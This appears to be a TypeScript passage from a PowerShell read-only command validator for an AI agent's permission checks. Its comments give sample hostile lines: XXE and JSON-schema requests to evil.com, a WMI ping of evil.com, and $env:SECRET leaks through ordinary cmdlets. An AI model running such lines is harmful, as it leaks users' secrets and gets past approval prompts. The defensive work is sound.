/**
 * PowerShell 只读命令验证模块。
 *
 * Cmdlet 名称不区分大小写；所有匹配均以小写形式进行。
 */

import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'

type ParsedStatement = ParsedPowerShellCommand['statements'][number]

import { getPlatform } from '../../utils/platform.js'
import {
  COMMON_ALIASES,
  deriveSecurityFlags,
  getPipelineSegments,
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../../utils/powershell/parser.js'
import type { ExternalCommandConfig } from '../../utils/shell/readOnlyCommandValidation.js'
import {
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import { COMMON_PARAMETERS } from './commonParameters.js'

const DOTNET_READ_ONLY_FLAGS = new Set([
  '--version',
  '--info',
  '--list-runtimes',
  '--list-sdks',
])

type CommandConfig = {
  /** 该命令允许的安全子命令或标志 */
  safeFlags?: string[]
  /**
   * 若为 true，则允许所有标志，忽略 safeFlags 的限制。
   * 适用于整个标志集均为只读的命令（例如 hostname）。
   * 若未设置此项且 safeFlags 为空或缺失，则拒绝所有标志（仅允许位置参数）。
   */
  allowAllFlags?: boolean
  /** 对原始命令的正则表达式约束 */
  regex?: RegExp
  /** 额外的验证回调——若返回 true 则表示命令存在危险 */
  additionalCommandIsDangerousCallback?: (
    command: string,
    element?: ParsedCommandElement,
  ) => boolean
}

/**
 * 用于检测 cmdlet 是否会通过参数泄漏值的共享回调。
 * `Write-Output $env:SECRET` 会直接打印秘密；`Start-Sleep $env:SECRET`
 * 则会通过类型转换错误（“无法将值 'sk-...' 转换为 System.Double”）泄露。
 * Bash 的 echo 正则表达式会对每个 token 进行安全字符白名单检查。
 *
 * 包含两项检查：
 * 1. elementTypes 白名单——StringConstant（字面量）+ Parameter（标志名称）。
 *    拒绝 Variable、Other（HashtableAst/ConvertExpressionAst/BinaryExpressionAst 均映射为 Other）、
 *    ScriptBlock、SubExpression、ExpandableString。与 SAFE_PATH_ELEMENT_TYPES 采用相同模式。
 * 2. 冒号绑定的参数值——`-InputObject:$env:SECRET` 会生成一个单一的 CommandParameterAst；
 *    其 VariableExpressionAst 作为 .Argument 子节点存在，并非独立的 CommandElement。
 *    elementTypes 为 ['...', 'Parameter']，白名单会放行。需查询 children[] 中 .Argument 的映射类型；
 *    任何非 StringConstant 的类型（Variable、ParenExpression、Hashtable 等）均为泄漏途径。
 */
export function argLeaksValue(
  _cmd: string,
  element?: ParsedCommandElement,
): boolean {
  const argTypes = (element?.elementTypes ?? []).slice(1)
  const args = element?.args ?? []
  const children = element?.children
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
      // ArrayLiteralAst (`Select-Object Name, Id`) 映射为 'Other' —— 解析脚本仅为
      // CommandParameterAst.Argument 填充 children，因此我们无法检查内部元素。
      // 回退至基于 extent 文本的字符串考古：Hashtable 含 `@{`，ParenExpr 含 `(`，
      // 变量含 `$`，类型字面量含 `[`，脚本块含 `{`。仅包含标识符的逗号列表不含这些字符。
      // `Name, $x` 仍会因 `$` 而被拒绝。
      if (!/[$(@{[]/.test(args[i] ?? '')) {
        continue
      }
      return true
    }
    if (argTypes[i] === 'Parameter') {
      const paramChildren = children?.[i]
      if (paramChildren) {
        if (paramChildren.some(c => c.type !== 'StringConstant')) {
          return true
        }
      } else {
        // 回退：对参数文本进行字符串考古（适用于旧解析器）。
        // 拒绝 `$`（变量）、`(`（ParenExpressionAst）、`@`（哈希/数组子表达式）、
        // `{`（脚本块）、`[`（类型字面量/静态方法）。
        const arg = args[i] ?? ''
        const colonIdx = arg.indexOf(':')
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return true
        }
      }
    }
  }
  return false
}

/**
 * 被认定为只读的 PowerShell cmdlet 白名单。
 * 每个 cmdlet 映射到包含安全标志的配置对象。
 *
 * 注意：PowerShell cmdlet 不区分大小写，因此键以小写存储，匹配前对输入进行规范化。
 *
 * 使用 Object.create(null) 防止原型链污染——攻击者控制的命令名称如 'constructor' 或 '__proto__'
 * 必须返回 undefined，而非继承自 Object.prototype 的属性。与 parser.ts 中的 COMMON_ALIASES 采用相同的防御策略。
 */
export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  Object.create(null) as Record<string, CommandConfig>,
  {
    // =========================================================================
    // PowerShell Cmdlets - 文件系统相关（只读）
    // =========================================================================
    'get-childitem': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Filter',
        '-Include',
        '-Exclude',
        '-Recurse',
        '-Depth',
        '-Name',
        '-Force',
        '-Attributes',
        '-Directory',
        '-File',
        '-Hidden',
        '-ReadOnly',
        '-System',
      ],
    },
    'get-content': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-TotalCount',
        '-Head',
        '-Tail',
        '-Raw',
        '-Encoding',
        '-Delimiter',
        '-ReadCount',
      ],
    },
    'get-item': {
      safeFlags: ['-Path', '-LiteralPath', '-Force', '-Stream'],
    },
    'get-itemproperty': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'test-path': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-PathType',
        '-Filter',
        '-Include',
        '-Exclude',
        '-IsValid',
        '-NewerThan',
        '-OlderThan',
      ],
    },
    'resolve-path': {
      safeFlags: ['-Path', '-LiteralPath', '-Relative'],
    },
    'get-filehash': {
      safeFlags: ['-Path', '-LiteralPath', '-Algorithm', '-InputStream'],
    },
    'get-acl': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Audit',
        '-Filter',
        '-Include',
        '-Exclude',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - 导航（仅改变工作目录，无其他副作用）
    // =========================================================================
    'set-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'push-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'pop-location': {
      safeFlags: ['-PassThru', '-StackName'],
    },

    // =========================================================================
    // PowerShell Cmdlets - 文本搜索/过滤（只读）
    // =========================================================================
    'select-string': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Pattern',
        '-InputObject',
        '-SimpleMatch',
        '-CaseSensitive',
        '-Quiet',
        '-List',
        '-NotMatch',
        '-AllMatches',
        '-Encoding',
        '-Context',
        '-Raw',
        '-NoEmphasis',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - 数据转换（纯转换，无副作用）
    // =========================================================================
    'convertto-json': {
      safeFlags: [
        '-InputObject',
        '-Depth',
        '-Compress',
        '-EnumsAsStrings',
        '-AsArray',
      ],
    },
    'convertfrom-json': {
      safeFlags: ['-InputObject', '-Depth', '-AsHashtable', '-NoEnumerate'],
    },
    'convertto-csv': {
      safeFlags: [
        '-InputObject',
        '-Delimiter',
        '-NoTypeInformation',
        '-NoHeader',
        '-UseQuotes',
      ],
    },
    'convertfrom-csv': {
      safeFlags: ['-InputObject', '-Delimiter', '-Header', '-UseCulture'],
    },
    'convertto-xml': {
      safeFlags: ['-InputObject', '-Depth', '-As', '-NoTypeInformation'],
    },
    'convertto-html': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Head',
        '-Title',
        '-Body',
        '-Pre',
        '-Post',
        '-As',
        '-Fragment',
      ],
    },
    'format-hex': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-InputObject',
        '-Encoding',
        '-Count',
        '-Offset',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - 对象检查与操作（只读）
    // =========================================================================
    'get-member': {
      safeFlags: [
        '-InputObject',
        '-MemberType',
        '-Name',
        '-Static',
        '-View',
        '-Force',
      ],
    },
    'get-unique': {
      safeFlags: ['-InputObject', '-AsString', '-CaseInsensitive', '-OnType'],
    },
    'compare-object': {
      safeFlags: [
        '-ReferenceObject',
        '-DifferenceObject',
        '-Property',
        '-SyncWindow',
        '-CaseSensitive',
        '-Culture',
        '-ExcludeDifferent',
        '-IncludeEqual',
        '-PassThru',
      ],
    },
    // 安全说明：已移除 select-xml。XML 外部实体（XXE）解析可能通过 -Content 或 -Xml 中的 DOCTYPE SYSTEM/PUBLIC 引用触发网络请求。
    // `Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM "http://evil.com/x">]><x>&e;</x>' -XPath '/'` 会发送 GET 请求。
    // PowerShell 的 XmlDocument.LoadXml 默认未禁用实体解析。移除以强制提示。
    'join-string': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Separator',
        '-OutputPrefix',
        '-OutputSuffix',
        '-SingleQuote',
        '-DoubleQuote',
        '-FormatString',
      ],
    },
    // 安全说明：已移除 Test-Json。-Schema（位置参数 1）接受包含指向外部 URL 的 $ref 的 JSON Schema
    // —— Test-Json 会获取这些 URL（网络请求）。safeFlags 仅校验显式标志，不校验位置绑定：
    // `Test-Json '{}' '{"$ref":"http://evil.com"}'` → 位置 1 绑定到 -Schema → safeFlags 检查到两个非标志参数，跳过两者 → 自动放行。
    'get-random': {
      safeFlags: [
        '-InputObject',
        '-Minimum',
        '-Maximum',
        '-Count',
        '-SetSeed',
        '-Shuffle',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - 路径实用工具（只读）
    // =========================================================================
    // convert-path 的唯一用途是解析文件系统路径。现已归入 CMDLET_PATH_CONFIG 以进行恰当的路径验证，
    // 因此此处的 safeFlags 仅列出路径参数（将由 CMDLET_PATH_CONFIG 验证）。
    'convert-path': {
      safeFlags: ['-Path', '-LiteralPath'],
    },
    'join-path': {
      // 已移除 -Resolve：它会触碰文件系统以验证组合后的路径是否存在，但该路径未经过允许目录的验证。
      // 不带 -Resolve 时，Join-Path 为纯字符串操作。
      safeFlags: ['-Path', '-ChildPath', '-AdditionalChildPath'],
    },
    'split-path': {
      // 已移除 -Resolve：理由同上。不带 -Resolve 时，Split-Path 为纯字符串操作。
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Qualifier',
        '-NoQualifier',
        '-Parent',
        '-Leaf',
        '-LeafBase',
        '-Extension',
        '-IsAbsolute',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - 其他系统信息（只读）
    // =========================================================================
    // 注意：Get-Clipboard 被刻意排除在外——它可能泄露用户复制过的密码或 API 密钥等敏感数据。
    // Bash 工具同样不会自动放行剪贴板命令（pbpaste、xclip 等）。
    'get-hotfix': {
      safeFlags: ['-Id', '-Description'],
    },
    'get-itempropertyvalue': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'get-psprovider': {
      safeFlags: ['-PSProvider'],
    },

    // =========================================================================
    // PowerShell Cmdlets - 进程/系统信息
    // =========================================================================
    'get-process': {
      safeFlags: [
        '-Name',
        '-Id',
        '-Module',
        '-FileVersionInfo',
        '-IncludeUserName',
      ],
    },
    'get-service': {
      safeFlags: [
        '-Name',
        '-DisplayName',
        '-DependentServices',
        '-RequiredServices',
        '-Include',
        '-Exclude',
      ],
    },
    'get-computerinfo': {
      allowAllFlags: true,
    },
    'get-host': {
      allowAllFlags: true,
    },
    'get-date': {
      safeFlags: ['-Date', '-Format', '-UFormat', '-DisplayHint', '-AsUTC'],
    },
    'get-location': {
      safeFlags: ['-PSProvider', '-PSDrive', '-Stack', '-StackName'],
    },
    'get-psdrive': {
      safeFlags: ['-Name', '-PSProvider', '-Scope'],
    },
    // 安全说明：已从白名单中移除 Get-Command。-Name（位置 0，ValueFromPipeline=true）会触发模块自动加载，
    // 执行 .psm1 初始化代码。链式攻击：在 PSModulePath 中预先植入模块，触发自动加载。
    // 此前曾尝试从 safeFlags 中移除 -Name/-Module 并拒绝位置 StringConstant，但管道输入（`'EvilCmdlet' | Get-Command`）
    // 因 args 为空而完全绕过回调。移除以强制提示。确实需要的用户可添加显式的允许规则。
    'get-module': {
      safeFlags: [
        '-Name',
        '-ListAvailable',
        '-All',
        '-FullyQualifiedName',
        '-PSEdition',
      ],
    },
    // 安全说明：已从白名单中移除 Get-Help。与 Get-Command 相同的模块自动加载风险
    // （-Name 具有 ValueFromPipeline=true，管道输入绕过参数级回调）。移除以强制提示。
    'get-alias': {
      safeFlags: ['-Name', '-Definition', '-Scope', '-Exclude'],
    },
    'get-history': {
      safeFlags: ['-Id', '-Count'],
    },
    'get-culture': {
      allowAllFlags: true,
    },
    'get-uiculture': {
      allowAllFlags: true,
    },
    'get-timezone': {
      safeFlags: ['-Name', '-Id', '-ListAvailable'],
    },
    'get-uptime': {
      allowAllFlags: true,
    },

    // =========================================================================
    // PowerShell Cmdlets - 输出及其他（无副作用）
    // =========================================================================
    // Bash 对等物：`echo` 通过自定义正则表达式自动放行（BashTool readOnlyValidation.ts:~1517）。
    // 该正则表达式对每个参数进行安全字符白名单检查。上文 argLeaksValue 说明了其防范的三种攻击形式。
    'write-output': {
      safeFlags: ['-InputObject', '-NoEnumerate'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Write-Host 绕过管道（信息流，PS5+），因此其能力严格弱于 Write-Output——但同样的
    // `Write-Host $env:SECRET` 通过显示泄露的问题仍然存在。
    'write-host': {
      safeFlags: [
        '-Object',
        '-NoNewline',
        '-Separator',
        '-ForegroundColor',
        '-BackgroundColor',
      ],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Bash 对等物：`sleep` 位于 READONLY_COMMANDS 中（BashTool readOnlyValidation.ts:~1146）。
    // 运行时无副作用——但 `Start-Sleep $env:SECRET` 会通过类型强制转换错误泄露。采用相同的防护。
    'start-sleep': {
      safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Format-* 和 Measure-Object 在经过安全审查（发现它们均接受与 Where-Object 相同的计算属性哈希表利用方式后，
    // 从 SAFE_OUTPUT_CMDLETS 移至此处。isSafeOutputCommand 是基于名称的检查，会在参数验证之前将它们过滤出审批循环。
    // 在此处，argLeaksValue 对参数进行验证：
    //   | Format-Table               → 无参数 → 安全 → 允许
    //   | Format-Table Name, CPU     → 位置 StringConstant → 安全 → 允许
    //   | Format-Table $env:SECRET   → Variable elementType → 拦截 → 透传至提示
    //   | Format-Table @{N='x';E={}} → Other (HashtableAst) → 拦截 → 透传
    //   | Measure-Object -Property $env:SECRET → 同上 → 拦截
    // allowAllFlags：argLeaksValue 验证参数 elementType（Variable/Hashtable/ScriptBlock → 拦截）。
    // Format-* 的标志本身（-AutoSize、-GroupBy、-Wrap 等）仅用于显示。若无 allowAllFlags，
    // 空的 safeFlags 默认将拒绝所有标志——`Format-Table -AutoSize` 会过度提示。
    'format-table': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-list': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-wide': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-custom': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'measure-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Select-Object/Sort-Object/Group-Object/Where-Object：与 format-* 具有相同的计算属性哈希表暴露面（about_Calculated_Properties）。
    // 已从 SAFE_OUTPUT_CMDLETS 中移除，但此前未包含于此，导致 `Get-Process | Select-Object Name` 过度提示。
    // argLeaksValue 以相同方式处理：StringConstant 属性名通过（`Select-Object Name`），
    // HashtableAst/ScriptBlock/Variable 参数被拦截（`Select-Object @{N='x';E={...}}`、`Where-Object { ... }`）。
    // allowAllFlags：-First/-Last/-Skip/-Descending/-Property/-EQ 等均为选择/排序标志——本身无害；
    // argLeaksValue 负责捕获危险的参数值。
    'select-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'sort-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'group-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'where-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Out-String/Out-Host 从 SAFE_OUTPUT_CMDLETS 移至此处——两者均接受 -InputObject，
    // 泄露方式与 Write-Output 相同。`Get-Process | Out-String -InputObject $env:SECRET` → 秘密被打印。
    // allowAllFlags：-Width/-Stream/-Paging/-NoNewline 均为显示标志；
    // argLeaksValue 负责捕获危险的 -InputObject 值。
    'out-string': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'out-host': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },

    // =========================================================================
    // PowerShell Cmdlets - 网络信息（只读）
    // =========================================================================
    'get-netadapter': {
      safeFlags: [
        '-Name',
        '-InterfaceDescription',
        '-InterfaceIndex',
        '-Physical',
      ],
    },
    'get-netipaddress': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-Type',
      ],
    },
    'get-netipconfiguration': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-Detailed', '-All'],
    },
    'get-netroute': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-DestinationPrefix',
      ],
    },
    'get-dnsclientcache': {
      // 安全说明：排除 -CimSession/-ThrottleLimit。-CimSession 连接远程主机（网络请求）。
      // 此前配置为空，导致所有标志均被放行。
      safeFlags: ['-Entry', '-Name', '-Type', '-Status', '-Section', '-Data'],
    },
    'get-dnsclient': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias'],
    },

    // =========================================================================
    // PowerShell Cmdlets - 事件日志（只读）
    // =========================================================================
    'get-eventlog': {
      safeFlags: [
        '-LogName',
        '-Newest',
        '-After',
        '-Before',
        '-EntryType',
        '-Index',
        '-InstanceId',
        '-Message',
        '-Source',
        '-UserName',
        '-AsBaseObject',
        '-List',
      ],
    },
    'get-winevent': {
      // 安全说明：移除 -FilterXml/-FilterHashtable。-FilterXml 接受包含 DOCTYPE 外部实体的 XML（XXE → 网络请求）。
      // -FilterHashtable 会被 elementTypes 的 'Other' 检查捕获（因为 @{} 是 HashtableAst），但此处显式移除。
      // 与上文移除的 Select-Xml 存在相同的 XXE 风险。-FilterXPath 保留（仅字符串模式，无实体解析）。
      // -ComputerName/-Credential 也被隐式排除。
      safeFlags: [
        '-LogName',
        '-ListLog',
        '-ListProvider',
        '-ProviderName',
        '-Path',
        '-MaxEvents',
        '-FilterXPath',
        '-Force',
        '-Oldest',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - WMI/CIM
    // =========================================================================
    // 安全说明：移除 Get-WmiObject 和 Get-CimInstance。它们会通过 Win32_PingStatus 等类主动触发网络请求
    // （枚举时发送 ICMP），并可通过 -ComputerName/CimSession 查询远程计算机。
    // -Class/-ClassName/-Filter/-Query 接受任意 WMI 类/WQL，无法静态验证。
    //   概念验证：Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
    //   → 向 evil.com 发送 ICMP（DNS 泄漏及可能的 NTLM 认证泄漏）。
    // WMI 还可能自动加载提供程序 DLL（初始化代码）。移除以强制提示。
    // get-cimclass 保留——仅列出类元数据，不枚举实例。
    'get-cimclass': {
      safeFlags: [
        '-ClassName',
        '-Namespace',
        '-MethodName',
        '-PropertyName',
        '-QualifierName',
      ],
    },

    // =========================================================================
    // Git - 使用共享的外部命令验证，进行逐标志检查
    // =========================================================================
    git: {},

    // =========================================================================
    // GitHub CLI (gh) - 使用共享的外部命令验证
    // =========================================================================
    gh: {},

    // =========================================================================
    // Docker - 使用共享的外部命令验证
    // =========================================================================
    docker: {},

    // =========================================================================
    // Windows 特定的系统命令
    // =========================================================================
    ipconfig: {
      // 安全说明：在 macOS 上，`ipconfig set <iface> <mode>` 会配置网络（写入系统配置）。
      // safeFlags 仅验证标志，位置参数被跳过。拒绝任何位置参数——仅允许无参数的 `ipconfig` 或
      // `ipconfig /all`（只读显示）。Windows 的 ipconfig 仅使用 / 标志（显示），macOS 的 ipconfig 使用子命令（get/set/waitall）。
      safeFlags: ['/all', '/displaydns', '/allcompartments'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        return (element?.args ?? []).some(
          a => !a.startsWith('/') && !a.startsWith('-'),
        )
      },
    },
    netstat: {
      safeFlags: [
        '-a',
        '-b',
        '-e',
        '-f',
        '-n',
        '-o',
        '-p',
        '-q',
        '-r',
        '-s',
        '-t',
        '-x',
        '-y',
      ],
    },
    systeminfo: {
      safeFlags: ['/FO', '/NH'],
    },
    tasklist: {
      safeFlags: ['/M', '/SVC', '/V', '/FI', '/FO', '/NH'],
    },
    // where.exe：Windows PATH 定位器，相当于 bash 的 `which`。通过 isAllowlistedCommand 中的 nameType 关口的 SAFE_EXTERNAL_EXES 旁路到达此处。
    // 所有标志均为只读（/R /F /T /Q），与 BashTool 的 READONLY_COMMANDS 中对 `which` 的处理一致。
    'where.exe': {
      allowAllFlags: true,
    },
    hostname: {
      // 安全说明：在 Linux/macOS 上，`hostname NAME` 会设置主机名（写入系统配置）。
      // `hostname -F FILE` / `--file=FILE` 也会从文件设置主机名。
      // 仅允许无参数的 `hostname` 和已知的只读标志。
      safeFlags: ['-a', '-d', '-f', '-i', '-I', '-s', '-y', '-A'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // 拒绝任何位置（非标志）参数——这会设置主机名。
        return (element?.args ?? []).some(a => !a.startsWith('-'))
      },
    },
    whoami: {
      safeFlags: [
        '/user',
        '/groups',
        '/claims',
        '/priv',
        '/logonid',
        '/all',
        '/fo',
        '/nh',
      ],
    },
    ver: {
      allowAllFlags: true,
    },
    arp: {
      safeFlags: ['-a', '-g', '-v', '-N'],
    },
    route: {
      safeFlags: ['print', 'PRINT', '-4', '-6'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // 安全说明：route.exe 的语法为 `route [-f] [-p] [-4|-6] VERB [args...]`。
        // 第一个非标志位置参数即为动词。`route add 10.0.0.0 mask 255.0.0.0 192.168.1.1 print` 会添加路由（print 是尾随的显示修饰符）。
        // 旧检查使用 args.some('print')，匹配任何位置的 'print'——与位置无关。
        if (!element) {
          return true
        }
        const verb = element.args.find(a => !a.startsWith('-'))
        return verb?.toLowerCase() !== 'print'
      },
    },
    // netsh：刻意不列入白名单。PR #22060 中的三轮黑名单扩展（动词位置 → 破折号标志 → 斜杠标志 → 更多动词）证明其语法过于复杂，无法安全地白名单化：
    // 三级上下文嵌套（`netsh interface ipv4 show addresses`）、双前缀标志（-f / /f）、通过 -f 和 `exec` 执行脚本、
    // 通过 -r 进行远程 RPC、离线模式提交、wlan connect/disconnect 等。每次黑名单扩展都暴露出新的漏洞。
    // `route` 保留——`route print` 是唯一的只读形式，具有简单的单动词位置语法。
    getmac: {
      safeFlags: ['/FO', '/NH', '/V'],
    },

    // =========================================================================
    // 跨平台 CLI 工具
    // =========================================================================
    // 文件检查
    // 安全说明：file -C 编译魔术数据库并写入磁盘。仅允许自省标志；拒绝 -C / --compile / -m / --magic-file。
    file: {
      safeFlags: [
        '-b',
        '--brief',
        '-i',
        '--mime',
        '-L',
        '--dereference',
        '--mime-type',
        '--mime-encoding',
        '-z',
        '--uncompress',
        '-p',
        '--preserve-date',
        '-k',
        '--keep-going',
        '-r',
        '--raw',
        '-v',
        '--version',
        '-0',
        '--print0',
        '-s',
        '--special-files',
        '-l',
        '-F',
        '--separator',
        '-e',
        '-P',
        '-N',
        '--no-pad',
        '-E',
        '--extension',
      ],
    },
    tree: {
      safeFlags: ['/F', '/A', '/Q', '/L'],
    },
    findstr: {
      safeFlags: [
        '/B',
        '/E',
        '/L',
        '/R',
        '/S',
        '/I',
        '/X',
        '/V',
        '/N',
        '/M',
        '/O',
        '/P',
        // 标志匹配前会剥离 ':'（例如 /C:pattern → /C），因此此处条目不应包含尾随的冒号。
        '/C',
        '/G',
        '/D',
        '/A',
      ],
    },

    // =========================================================================
    // 包管理器 - 使用共享的外部命令验证
    // =========================================================================
    dotnet: {},

    // 安全说明：移除了 man 和 help 的直接条目。它们会通过别名解析为 Get-Help（也已移除——见上文）。
    // 若无这些条目，lookupAllowlist 会通过 COMMON_ALIASES 解析为 'get-help'，而后者不在白名单中 → 触发提示。
    // 与 Get-Help 相同的模块自动加载风险。
  },
)

/**
 * 可以接收管道输入的安全输出/格式化 cmdlet。
 * 以小写形式存储规范的 cmdlet 名称。
 */
const SAFE_OUTPUT_CMDLETS = new Set([
  'out-null',
  // 不包含 out-string/out-host——两者均接受 -InputObject，其泄露方式与 Write-Output 相同。
  // 已移至 CMDLET_ALLOWLIST 并由 argLeaksValue 验证。
  // `Get-Process | Out-String -InputObject $env:SECRET` —— Out-String 此前仅通过名称过滤，$env 参数从未被验证。
  // out-null 保留：丢弃一切输出，无 -InputObject 泄露。
  // 不包含 foreach-object / where-object / select-object / sort-object / group-object / format-table /
  // format-list / format-wide / format-custom / measure-object —— 它们均接受计算属性哈希表或脚本块谓词，
  // 在运行时评估任意表达式（about_Calculated_Properties）。例如：
  //   Where-Object @{k=$env:SECRET}       —— HashtableAst 参数，'Other' elementType
  //   Select-Object @{N='x';E={...}}      —— 计算属性脚本块
  //   Format-Table $env:SECRET            —— 位置 -Property，打印为标题
  //   Measure-Object -Property $env:SECRET —— 通过“未找到属性 'sk-...'”泄露
  //   ForEach-Object { $env:PATH='e' }    —— 任意脚本主体
  // isSafeOutputCommand 是基于名称的检查——第 5 步会将这些 cmdlet 过滤出审批循环，早于参数验证。
  // 若包含它们，则完全由安全输出组成的管道尾部会因空 subCommands 而自动放行，无论参数内容如何。
  // 移除以强制管道尾部通过参数级验证（哈希表是 'Other' elementType → 在 isAllowlistedCommand 处未通过白名单 → 询问；
  // 裸 $var 是 'Variable' → 同上）。
  //
  // 不包含 write-output —— 管道初始的 $env:VAR 是 VariableExpressionAst，被 getSubCommandsForPermissionCheck 跳过（非 CommandAst）。
  // 若 write-output 在此处，`$env:SECRET | Write-Output` → WO 被过滤为安全输出 → 空 subCommands → 自动放行 → 秘密打印。
  // CMDLET_ALLOWLIST 中的条目处理直接的 `Write-Output 'literal'`。
])

/**
 * 已从 SAFE_OUTPUT_CMDLETS 移至 CMDLET_ALLOWLIST 并由 argLeaksValue 验证的 cmdlet。
 * 这些是管道尾部转换器（Format-*、Measure-Object、Select-Object 等），此前仅通过名称过滤为安全输出。
 * 现在它们需要参数验证（argLeaksValue 拦截计算属性哈希表/脚本块/变量参数）。
 *
 * 用于 checkPermissionMode 和 isReadOnlyCommand 中狭窄回退路径的 isAllowlistedPipelineTail——
 * 这些调用方需要与 SAFE_OUTPUT_CMDLETS 相同的“跳过无害管道尾部”行为，但带有 argLeaksValue 防护。
 */
const PIPELINE_TAIL_CMDLETS = new Set([
  'format-table',
  'format-list',
  'format-wide',
  'format-custom',
  'measure-object',
  'select-object',
  'sort-object',
  'group-object',
  'where-object',
  'out-string',
  'out-host',
])

/**
 * 允许通过 nameType='application' 关口的外部 .exe 名称。
 *
 * classifyCommandName 对包含点的任何名称返回 'application'，isAllowlistedCommand 中的 nameType 关口会在白名单查找之前拒绝此类名称。
 * 该关口旨在阻止通过 scripts\Get-Process → stripModulePrefix → cmd.name='Get-Process' 进行的仿冒。
 * 但它也会误伤良性的 PATH 解析的 .exe 名称，如 where.exe（相当于 bash 的 `which`——纯读取，无危险标志）。
 *
 * 安全说明：该旁路检查的是 cmd.text 的原始第一个 token，而非 cmd.name。
 * stripModulePrefix 会将 scripts\where.exe 折叠为 cmd.name='where.exe'，但 cmd.text 保留了原始的 'scripts\where.exe ...'。
 * 匹配 cmd.text 的第一个 token 可以挫败仿冒——仅裸的 `where.exe`（PATH 查找）能通过。
 *
 * 此处的每个条目都必须在 CMDLET_ALLOWLIST 中有对应的条目以进行标志验证。
 */
const SAFE_EXTERNAL_EXES = new Set(['where.exe'])

/**
 * Windows PATHEXT 扩展名，PowerShell 通过 PATH 查找解析这些扩展名。
 * `git.exe`、`git.cmd`、`git.bat`、`git.com` 在运行时都会调用 git，必须解析为相同的规范名称，以便触发 git 安全防护。
 * 刻意排除 .ps1——名为 git.ps1 的脚本并非 git 二进制文件，不会触发 git 的钩子机制。
 */
const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/

/**
 * 使用 COMMON_ALIASES 将命令名称解析为其规范的 cmdlet 名称。
 * 对于不含路径的名称，剥离 Windows 可执行文件扩展名（.exe、.cmd、.bat、.com），
 * 以便 `git.exe` 规范化为 `git` 并触发 git 安全防护（powershellPermissions.ts 中的 hasGitSubCommand）。
 * 安全说明：仅当名称中无路径分隔符时才剥离——`scripts\git.exe` 是相对路径（运行本地脚本，而非 PATH 解析的 git），
 * 不得规范化为 `git`。返回小写的规范名称。
 */
export function resolveToCanonical(name: string): string {
  let lower = name.toLowerCase()
  // 仅对裸名称剥离 PATHEXT——路径形式会运行特定文件，而非防护措施所针对的 PATH 解析的可执行文件。
  if (!lower.includes('\\') && !lower.includes('/')) {
    lower = lower.replace(WINDOWS_PATHEXT, '')
  }
  const alias = COMMON_ALIASES[lower]
  if (alias) {
    return alias.toLowerCase()
  }
  return lower
}

/**
 * 检查命令名称（经过别名解析后）是否会改变同一复合命令中后续语句的路径解析命名空间。
 *
 * 涵盖两类情况：
 * 1. 改变当前工作目录的 cmdlet：Set-Location、Push-Location、Pop-Location（及其别名 cd、sl、chdir、pushd、popd）。
 *    后续相对路径将从新的 cwd 解析。
